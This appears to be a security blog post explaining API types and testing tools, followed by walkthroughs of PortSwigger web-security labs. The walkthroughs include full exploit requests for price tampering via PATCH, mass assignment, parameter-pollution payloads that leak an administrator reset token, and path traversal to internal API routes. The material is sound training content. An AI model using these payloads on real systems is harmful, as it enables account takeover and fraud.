---
title: "API Testing"
date: 2026-10-16
draft: false
aliases:
  - /posts/api/
description: ""
tags:
  - api
  - web
  - labs
categories:
  - web
---


## Description

In this section we will be talk about API pentesting in details. As well as what should we know and how to study & how to testing. 

## API Fundamentals

### What is an API

An API is a digital handshake that enables two applications to securely and efficiently exchange information or services. It acts as a communication bridge, simplifying complex interactions while fostering seamless collaboration across diverse systems.Let’s consider a fictional API for a social media platform called “SocialNet.” One of the API endpointsmight be the following:

Endpoint: `/users/{userId}/posts`

This endpoint allows users with permission to retrieve the posts made by a specific user on the SocialNet platform. By replacing {userId} with the unique identifier of a user, API consumers can access the posts associated with that user.

The Provider - Host of the API 

The Consumer - Person making an API request 

The acronym CRUD, which stands for Create, Read, Update, Delete, describes the primary actions and methods used to interact with APIs.

Create is the process of making new records, accomplished through a POST request. 
Read is data retrieval, done through a GET request. 
Update is how currently existing records are modified without being overwritten and is accomplished with POST or PUT requests. Delete is the process of erasing records, which can be done with POST or DELETE, as shown in this example. 

`DELETE /applications/{client_id}/grants/{access_token}`

***Note that CRUD is a best practice only, and developers may implement their APIs in other ways.***

Curly brackets mean that a given variable is necessary within the path parameters. The `{client_id}` variable must be replaced with an actual client’s ID, and the `{access_token}` variable must be replaced with your own access token. Tokens are what API providers use to identify and authorize requests to approved API consumers. Other API documentation might use a colon or square brackets to signify a variable (for example, `/api/v2/:customers/` or `/api/:collection/:client_id`


### API Types

This section describes the two primary API types we’ll focus on 1. `RESTful APIs` 2. `GraphQL`

#### REST

Representational State Transfer (REST) is a set of architectural constraints for applications that communicate using HTTP methods. APIs that use REST constraints are called RESTful (or just REST) APIs. 

REST is a style rather than a protocol, so each RESTful API may be different. It may have methods enabled beyond CRUD, its own sets of authentication requirements, subdomains instead of paths for endpoints, different rate-limit requirements, and so on. Furthermore, developers or an organization may call their API “RESTful” without adhering to the standard, which means you can’t expect every API you come across to meet all the REST constraints.

```bash
GET /api/v3/inventory/item/pillow HTTP/1.1
HOST: rest-shop.com
User-Agent: Mozilla/5.0
Accept: application/json
```
We make a request to the rest-shop.com for the pillows listing from the inventory.

```bash
HTTP/1.1 200 OK
Server: RESTfulServer/0.1
Cache-Control: no-store
Content-Type: application/json
{
"item": {
 "id": "00101",
 "name": "pillow",
 "count": 25
 "price": {
"currency": "USD",
"value": "19.99"
}
 },
}
```

***One thing to note:*** 

The rest-shop.com store provided all the information it had about the resource “pillow” in its response. 
If the consumer’s application only needed the name and value of the pillow, the consumer would need to filter out the additional information. The amount of information sent back to a consumer completely depends on how the API provider has
programmed its API.

REST APIs have some common headers you should become familiar with. These are identical to HTTP headers but are more commonly seen in REST API requests than in other API types, so they can help you identify REST APIs.

***Authorization***

Authorization headers are used to pass a token or credentials to the API provider. 
The format of these headers is `Authorization: <type> <token/credentials>.`

For example, take a look at the following authorization header:

`Authorization: Bearer gglwvv4mvea` 

There are different authorization types. Basic uses `base64-encoded` credentials. Bearer uses an `API token`. Finally, 
`AWS-HMAC-SHA256` is an AWS authorization type that uses an access key and a secret key.

Example CTF style `API (200 Marks)` for this knid of vuln `https://gadak-h1.github.io/posts/ucsyctf2026-web/`

***Content Type***

Content-Type headers are used to indicate the type of media being transferred. These headers differ from Accept headers, which state the media type you want to receive; 
Content-Type headers describe the media you’re sending.
Here are some common Content-Type headers for REST APIs:

`application/json` : Used to specify JavaScript Object Notation (JSON) as a media type. JSON is the most common media type for REST APIs. Example format : 

```json

 "firstName": "James",
 "lastName": "Lovell",
 "tripsToTheMoon": 2,
 "isAstronaut": true,
 "walkedOnMoon": false,
 "comment" : "This is a comment",
 "spacecrafts": ["Gemini 7", "Gemini 12", "Apollo 8", "Apollo 13"],
 "book": [
 {
 "title": "Lost Moon",
 "genre": "Non-fiction"
 }
 ]
}
```

`application/xml` : Used to specify XML as a media type.

```XML
<?xml version="1.0" encoding="UTF-8" ?> 1
<root> 2
 <id>1278533978970976300</id>
 <id_str>1278533978970976256</id_str>
 <full_text>1984: William Gibson published his debut novel, Neuromancer. It&#x27;s a cyberpunk
tale about Henry Case, a washed up computer hacker who&#x27;s offered a chance at redemption by
a mysterious dude named Armitage. Cyberspace. Hacking. Virtual reality. The matrix. Hacktivism.
A must read. https://t.co/R9hm2LOKQi </full_text>
 <truncated>false</truncated>
</root>
```

XML must have a
root element and can contain child elements. In the example, the root element is `<root>`. The child elements are XML attributes. An example of a child element is the `<BookGenre>` element within the following example:

```XML
<LibraryBooks>
<BookGenre>SciFi</BookGenre>
</LibraryBooks>
```


#### GraphQL

Graph Query Language, GraphQL is a specification for APIs that allow clients to define the structure of the data they want to request from the server. GraphQL also takes the approach of being `query-centric`, because it is structured to function similarly to a database query language like Structured Query Language (SQL). To access a GraphQL API, you’ll typically access the URL where it is hosted and submit an authorized request that contains query parameters as the body of a POST request, similar to the following:

```bash
query {
 users {
 username
 id
 email
 }
}
```
In the right context the Response should be look like this :

```bash
{
 "data": {
 "users": {
 "username": "hapi_hacker",
 "id": 1111,
 "email": "hapihacker@email.com"
 }
 }
}
```

GraphQL also uses HTTP, but it typically depends on a single entry point (URL) using the POST method. In a GraphQL request, the body of the POST request is what the provider processes. For example, take a look at the GraphQL request 

```bash
POST /graphql HTTP/1.1
HOST: graphql-shop.com
Authorization: Bearer ab4dt0k3n
{query {
 inventory (item:"Graphics Card", id: 00101) {
name
fields{
price
quantity} } }
}
```



```bash 
HTTP/1.1 200 OK
Content-Type: application/json
Server: GraphqlServer   
{
"data": {
"inventory": { "name": "Graphics Card",
"fields":[
{
"price":"999.99"
"quantity": 25 } ] } }
}

```

As you can see, a query payload in the body specifies the information needed. The GraphQL request body begins with the 
`1. query operation` , which is the equivalent of a GET request and used to obtain information from the API. 
The GraphQL node we are querying for, `2. inventory` , is also known as the root query type. Nodes, similar to objects, are made up of `3. fields` , similar to key/value pairs in REST. The main difference here is that we can specify the exact fields we are looking for. In this example, we are looking for the `“price”` and `“quantity”` fields. Finally, you can see that
the GraphQL response only provided the requested fields for the specified graphics card . Instead of getting the item ID, item name, and other superfluous informaton like REST API. 

We can use Postman, ApolloClient, GraphQL-Request, GraphQL-CLI, or GraphQL-Compose for interact with GraphQL. 
In later Pratical labs we will use Postman as main.  

#### SOAP

Simple Object Access Protocol (SOAP) is a type of action-oriented API that relies on XML. Although SOAP works over HTTP, SMTP, TCP, and UDP, it was primarily designed for use over HTTP. 

When SOAP is used over HTTP, the requests are all made using HTTP POST. For example, take a look at the following sample

***Note : For seeing visible I put `<- ***text***` in each line of request so please read them carefully by matchin with request , reponse & explanation below***
SOAP request :

```bash
POST /Inventory HTTP/1.1
Host: www.soap-shop.com
Content-Type: application/soap+xml; charset=utf-8
Content-Length: nnn
<?xml version="1.0"?>
<soap:Envelope <- ***1. the envelope*** 
xmlns:soap="http://www.w3.org/2003/05/soap-envelope/" <- ***2. the header***
soap:encodingStyle="http://www.w3.org/2003/05/soap-encoding"> <- ***3. the body***
<soap:Body xmlns:m="http://www.soap-shop.com/inventory">
 <m:GetInventoryPrice>
 <m:InventoryName>ThebestSOAP</m:InventoryName>
 </m:GetInventoryPrice>
</soap:Body>
</soap:Envelope>

```
The corresponding SOAP response looks like this:

```bash
HTTP/1.1 200 OK
Content-Type: application/soap+xml; charset=utf-8
Content-Length: nnn
<?xml version="1.0"?>
<soap:Envelope
xmlns:soap="http://www.w3.org/2003/05/soap-envelope/"
soap:encodingStyle="http://www.w3.org/2003/05/soap-encoding">
<soap:Body xmlns:m="http://www.soap-shop.com/inventory">
<soap:Fault> <- ***4.the fault***
<faultcode>soap:VersionMismatch</faultcode>
 <faultstring, xml:lang='en">
 Name does not match Inventory record
 </faultstring>
</soap:Fault
</soap:Body>
</soap:Envelope>

```


SOAP API messages are made up of four parts: 1. `the envelope`, 2. `the header` which are necessary, 3. `the body`  & 4.`fault`
which are optional. The `header` can be used to process a message; in this example, the Content-Type request header lets the SOAP provider know the type of content being sent in the POST request (application/soap+xml). Since APIs facilitate machine-to-machine communication, headers essentially form an agreement between the consumer and the provider concerning the expectations within the request. Headers are a way to ensure that theconsumer and provider understand one another and are speaking the same language. The `body` is the primary payload of the XML message, meaning it contains the data sent to the application. The `fault` is an optional part of a SOAP response that can be used to provide error messaging.

## Crafting API Requests in Postman, an API Browse 

`$ sudo wget https://dl.pstmn.io/download/latest/linux64 -O postman-linux-x64.tar.gz`

`$ sudo tar -xvzf postman-linux-x64.tar.gz -C /opt`

`$ sudo ln -s /opt/Postman/Postman /usr/bin/postman`

If evertyhing fines we can use this with command -> `postman` 

For foxyproxy OPTIONS -> Proxy -> Add the IP `127.0.0.1` postman default port 5555 

![postmanRequestBuilder.png](/images/API/postmanRequestBuilder.png)

The request builder contains several tabs useful for precisely constructing the parameters, headers, and body of a request.

When connecting wit burpsuite just set as normal `127.0.0.1` `8080`

## Discovering API Endpoints with Kiterunner

 `git clone https://github.com/assetnote/kiterunner.git`
 
 `cd kiterunner`
 
 `make build`
 
 `sudo ln -s $(pwd)/dist/kr /usr/local/bin/kr`

 You can use the api fuzzing wordlists from below (secLists also great it should be main and this one should only be use under pentesting with permission cause it can create a lot of noise. )

 `https://wordlists-cdn.assetnote.io/data/`


`kr scan https://domain.com/api/ -w routes-large.kite -x 20`
 
 `kr scan https://domain.com/api/ -A=apiroutes-220828 -x 20`
 
 `kr brute https://domain.com/api/ -A=raft-large-words -x 20 -d=0`
 
 `kr brute https://domain.com/api/ -w /tmp/lang-english.txt -x 20 -d=0`

 This is from Hacktrick for usage you can chnage the wordlists and command as you want to. 

 ## Discovering HTTP Parameters with Arjun

 `https://github.com/s0md3v/arjun`

 You can install using - `pipx install arjun`


## OWASP API Security Top 10 (2023)

This is the standard framework for API testing under OWASP :  https://api-security.owasp.org/editions/2023/en/0x11-t10/
You can read details there as standard testing for understanding the API security. 

## Portswigger API Labs

### Lab: Exploiting an API endpoint using documentation

Goal : To delete the `carlos` user by calling the API. Given credentials `wiener:peter`

Analysis : We try to work around the URL with the `/api` endpoint and it exists. 

![Lab1apifoundimage](/images/API/Lab1_apiFound.png)

Exploitation : 

We found the API usage for SHOP, which is in the REST API. When we click the `DELETE` table, it shows us how we can delete the user. And the lab is solved 

![Lab1apiUserimage](/images/API/Lab1_apiUser.png)

### Lab: Finding and exploiting an unused API endpoint

Goal : Exploit a hidden API endpoint to buy a Lightweight l33t Leather Jacket.

Analysis : 

We analyzed the lab JS file and others but didn't find anything, so we crawled the URL by using Burp Suite's FoxyProxy on (you don't need to turn on the intercept, just crawling and watching the requests in HTTP Requests is enough).

We have found the following request and response :

```http
GET /api/products/1/price HTTP/2
Host: 0aa1000a032b60f980583a7200b60075.web-security-academy.net
Cookie: session=6bsuOLallJYFSKFWgtMrBxErvrJqtfih
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa1000a032b60f980583a7200b60075.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

```

Response : 

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 87

{"price":"$1337.00","message":"22 people have viewed this item in the last 10 minutes"}

```
![Lab2_crawlerurlimage](/images/API/Lab2_Crawlurl.png)

What if we can change the price from this API path ? 


Exploitation :

We send the above request to the Repeater and change the HTTP method to `OPTIONS`, which shows us which methods are allowed or not. 

![Lab2_methodimage](/images/API/Lab2_method.png)

And we can see there are only `GET` & `PATCH` methods allowed. We try to change the price with the `PATCH` method but it doesn't recognize the Content-Type, which is JSON format, as shown in the response below. 

Response : 

```json
{"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}

```

So we try to put the Content-Type header - `Content-Type: application/json` & make the price into 0 with JSON format 

Exploit Request :

```http
PATCH /api/products/1/price HTTP/2
Host: 0aa1000a032b60f980583a7200b60075.web-security-academy.net
Cookie: session=6bsuOLallJYFSKFWgtMrBxErvrJqtfih
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa1000a032b60f980583a7200b60075.web-security-academy.net/product?productId=1
Content-Type: application/json
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
Content-Length: 22

{
    "price": 0
}

```
Response : 

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

{"price":"$0.00"}

```
![Lab2_repirce](/images/API/Lab2_repirce.png)


The price becomes 0 as shown. When we buy that item from the cart, we can see it is successful 

![Lab2_Solve](/images/API/Lab2_Solve.png)


### Lab: Exploiting a mass assignment vulnerability

Goal : Exploit a mass assignment vulnerability to buy a Lightweight l33t Leather Jacket.

Analysis : We just log in with the given credentials by using `wiener:peter`. After logging in, I manually crawl the items and URL like in the previous labs and found `/api/checkout`

![Lab3_crawl](/images/API/Lab3_crawl.png)


Request : 

```http
GET /api/checkout HTTP/2
Host: 0afe0092042cb90d81571b1b009300ca.web-security-academy.net
Cookie: session=48gJym1TKX3vUFVkXzZlWIUppaKlXKBP
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0afe0092042cb90d81571b1b009300ca.web-security-academy.net/cart
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

```
Response : 

```http

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 236

{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700},{"product_id":"2","name":"Inflatable Holiday Home","quantity":1,"item_price":1374}]}

```
I send this to Repeater and set the method to `OPTIONS` to know which methods are allowed. 

![Lab3_method](/images/API/Lab3_method.png)

I also notice that `/api` exists and we can see the API usage 

![Lab3_api](/images/API/Lab3_api.png)

Exploitation : 

In Repeater I put the `/api/checkout` request with the `POST` method with `Content-Type: application/json` and put the JSON request below. 

```json
{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":0}]}

```

You can see how to send that JSON format in the `/api` endpoint behind the lab URL 

![Lab3_apiJson](/images/API/Lab3_apiJson.png)

Above doesn't succeed because we must put `100` in the discount percentage, so I send the new request with the new JSON.

```http
POST /api/checkout HTTP/2
Host: 0afe0092042cb90d81571b1b009300ca.web-security-academy.net
Cookie: session=48gJym1TKX3vUFVkXzZlWIUppaKlXKBP
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0afe0092042cb90d81571b1b009300ca.web-security-academy.net/cart
Content-Type: application/json
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
Content-Length: 183

{
    "chosen_discount": {
        "percentage": 100
    },
    "chosen_products": [
        {
            "product_id": "1",
            "quantity": 1
        }
    ]
}



```

And we can see it works. 

![Lab3_success](/images/API/Lab3_success.png)


### Lab: Exploiting server-side parameter pollution in a query string

Goal : Log in as the administrator and delete carlos. 

Analysis : We try to crawl every function on the lab and found that forgotpassword is a little bit interesting.

![Lab4reqforgot.png](/images/API/Lab4reqforgot.png)

We sent it to Repeater and found that we can send the admin email to get the reset token. 

![Lab4reqadmin.png](/images/API/Lab4reqadmin.png)

Also there is a JavaScript file which is called `static.js`, from there we get the parameter like `/forgotpassword?resetoken={value}`

```javascript

let forgotPwdReady = (callback) => {
    if (document.readyState !== "loading") callback();
    else document.addEventListener("DOMContentLoaded", callback);
}

function urlencodeFormData(fd){
    let s = '';
    function encode(s){ return encodeURIComponent(s).replace(/%20/g,'+'); }
    for(let pair of fd.entries()){
        if(typeof pair[1]=='string'){
            s += (s?'&':'') + encode(pair[0])+'='+encode(pair[1]);
        }
    }
    return s;
}

const validateInputsAndCreateMsg = () => {
    try {
        const forgotPasswordError = document.getElementById("forgot-password-error");
        forgotPasswordError.textContent = "";
        const forgotPasswordForm = document.getElementById("forgot-password-form");
        const usernameInput = document.getElementsByName("username").item(0);
        if (usernameInput && !usernameInput.checkValidity()) {
            usernameInput.reportValidity();
            return;
        }
        const formData = new FormData(forgotPasswordForm);
        const config = {
            method: "POST",
            headers: {
                "Content-Type": "x-www-form-urlencoded",
            },
            body: urlencodeFormData(formData)
        };
        fetch(window.location.pathname, config)
            .then(response => response.json())
            .then(jsonResponse => {
                if (!jsonResponse.hasOwnProperty("result"))
                {
                    forgotPasswordError.textContent = "Invalid username";
                }
                else
                {
                    forgotPasswordError.textContent = `Please check your email: "${jsonResponse.result}"`;
                    forgotPasswordForm.className = "";
                    forgotPasswordForm.style.display = "none";
                }
            })
            .catch(err => {
                forgotPasswordError.textContent = "Invalid username";
            });
    } catch (error) {
        console.error("Unexpected Error:", error);
    }
}

const displayMsg = (e) => {
    e.preventDefault();
    validateInputsAndCreateMsg(e);
};

forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});

```

Now we know some of the parameters that we can get manually, so let's step to exploitation.

Exploitation : 


We try to play with the parameter using `#` and `&` to get the response.

`#` means we comment out everything. 

`&` means we connect between the two parameters and see the response value. 

Request :


```http
POST /forgot-password HTTP/2
Host: 0aa400bb036e08fc80ab7182000700ac.web-security-academy.net
Cookie: session=QfQXD1hjoZSK5JHVocrXulJTxirVzqLy
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa400bb036e08fc80ab7182000700ac.web-security-academy.net/forgot-password
Content-Type: x-www-form-urlencoded
Content-Length: 77
Origin: https://0aa400bb036e08fc80ab7182000700ac.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=KDFHFtFHN0Ooaku6Zo4mPExpPHT3EIpo&username=administrator%26reset_toke=123

```

We try to connect the `reset_token` parameter with `&`, which is `%26` or `CTRL+U` in Burp Suite.

Response : 

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 40

{"error": "Parameter is not supported."}

```

We can see the parameter is not supported. So we know `reset_token` isn't a parameter anymore, so try with `#`, which is `%23`, to comment out everything behind `administrator`

Request : 

```http
POST /forgot-password HTTP/2
Host: 0aa400bb036e08fc80ab7182000700ac.web-security-academy.net
Cookie: session=QfQXD1hjoZSK5JHVocrXulJTxirVzqLy
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa400bb036e08fc80ab7182000700ac.web-security-academy.net/forgot-password
Content-Type: x-www-form-urlencoded
Content-Length: 77
Origin: https://0aa400bb036e08fc80ab7182000700ac.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=KDFHFtFHN0Ooaku6Zo4mPExpPHT3EIpo&username=administrator%23reset_toke=123

```

Response :

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 33

{"error": "Field not specified."}

```

We can find that the field parameter isn't specified. So we try to connect the `username` parameter and the `field` parameter together — what will happen ? 

```text
csrf=KDFHFtFHN0Ooaku6Zo4mPExpPHT3EIpo&username=administrator%26field=123
```

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 58

{"type":"ClientError","code":400,"error":"Invalid field."}

```

We can see this is Invalid field, and I think the value is wrong, so we will try to enumerate the parameter with Intruder. 

![lab4intruder](/images/API/Lab4intruder.png)

***Note : We can use the payload as -> Server-side variable name payload -> which can be added from the list in Burp Suite Pro.***

We found that `username` and `email` exist as `field` values 

Request : 

```http
POST /forgot-password HTTP/2
Host: 0aa400bb036e08fc80ab7182000700ac.web-security-academy.net
Cookie: session=QfQXD1hjoZSK5JHVocrXulJTxirVzqLy
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa400bb036e08fc80ab7182000700ac.web-security-academy.net/forgot-password
Content-Type: x-www-form-urlencoded
Content-Length: 77
Origin: https://0aa400bb036e08fc80ab7182000700ac.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

csrf=KDFHFtFHN0Ooaku6Zo4mPExpPHT3EIpo&username=administrator%26field=email%23

```
Response : 

```http

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"type":"email","result":"*****@normal-user.net"}

```

We found the email response, so let's try with `reset_token` as the field value.

![Lab4resettoken](/images/API/Lab4resettoken.png)

And we got the token. Try to put it in the URL of `https://0aa400bb036e08fc80ab7182000700ac.web-security-academy.net/forgot-password?reset_token={value}` that we got in the first step, and we can see the new password change function and get the admin panel.


![lab4adminsuccess](/images/API/Lab4Adminsuccess.png)

Delete carlos and solve the lab.

***Note : In parameter finding with Intruder, I think we can use the wordlists from SecLists (sudo apt install seclists -y) => /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt, and `/api` can be used as well***

### Lab: Exploiting server-side parameter pollution in a REST URL

Goal : Log in as the administrator and delete carlos. 

Analysis : We have found the `forgotPassword.js` file and there is a route for the forgot password token as in the lab above 

```javascript
let forgotPwdReady = (callback) => {
    if (document.readyState !== "loading") callback();
    else document.addEventListener("DOMContentLoaded", callback);
}

function urlencodeFormData(fd){
    let s = '';
    function encode(s){ return encodeURIComponent(s).replace(/%20/g,'+'); }
    for(let pair of fd.entries()){
        if(typeof pair[1]=='string'){
            s += (s?'&':'') + encode(pair[0])+'='+encode(pair[1]);
        }
    }
    return s;
}

const validateInputsAndCreateMsg = () => {
    try {
        const forgotPasswordError = document.getElementById("forgot-password-error");
        forgotPasswordError.textContent = "";
        const forgotPasswordForm = document.getElementById("forgot-password-form");
        const usernameInput = document.getElementsByName("username").item(0);
        if (usernameInput && !usernameInput.checkValidity()) {
            usernameInput.reportValidity();
            return;
        }
        const formData = new FormData(forgotPasswordForm);
        const config = {
            method: "POST",
            headers: {
                "Content-Type": "x-www-form-urlencoded",
            },
            body: urlencodeFormData(formData)
        };
        fetch(window.location.pathname, config)
            .then(response => response.json())
            .then(jsonResponse => {
                if (!jsonResponse.hasOwnProperty("result"))
                {
                    forgotPasswordError.textContent = "Invalid username";
                }
                else
                {
                    forgotPasswordError.textContent = `Please check your email: "${jsonResponse.result}"`;
                    forgotPasswordForm.className = "";
                    forgotPasswordForm.style.display = "none";
                }
            })
            .catch(err => {
                forgotPasswordError.textContent = "Invalid username";
            });
    } catch (error) {
        console.error("Unexpected Error:", error);
    }
}

const displayMsg = (e) => {
    e.preventDefault();
    validateInputsAndCreateMsg(e);
};

forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?passwordResetToken=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});

```
```text
https://0a0b00ca046c982b82bef12600be001b.web-security-academy.net/forgot-password?passwordResetToken=${resetToken}
```

If we can put the password reset token, we can assume we got the admin panel 

Exploitation :

We first send the forgot-password request to Repeater 

![Lab5forgotPass.png](/images/API/Lab5ForgotPass.png)

Then in `username=administrator` we will put `#` to comment out everything, and it responds with the error which is 

```http
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 86

{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

This shouldn't happen. The error should be at least in "username not found etc", right now this suggests that the server may have placed the input in the path of a server-side request, and that the fragment has truncated some trailing data. Also `Invalid route. Please refer to the API definition` is also nonsense.


We will start the exploit by using path traversal in the username value as `../administrator`

![Lab5PathTraverse1.png](/images/API/Lab5Pathtraverse1.png)

We can't find anything until `../../../../administrator`, so we change the exploit payload into `../../../../%23` and found a new error. 

![Lab5PathTraverse2.png](/images/API/Lab5Pathtraverse2.png)

So we try with `../../../../openapi.json%23` and found the API source there : `/api/internal/v1/users/{username}/field/{field}`. We can use this as 

`../../v1/users/administrator/field/{something we have to know which one works}` 

We already know there is a parameter which is `passwordResetToken`, so if we put it there and call it, can we get the reset token ? 

And we have found that it works. 

![Lab5resetToken.png](/images/API/Lab5resetToken.png)

We can use that token to put in the previous parameter and get the password change function. The lab is solved after you log in and delete the carlos user. 





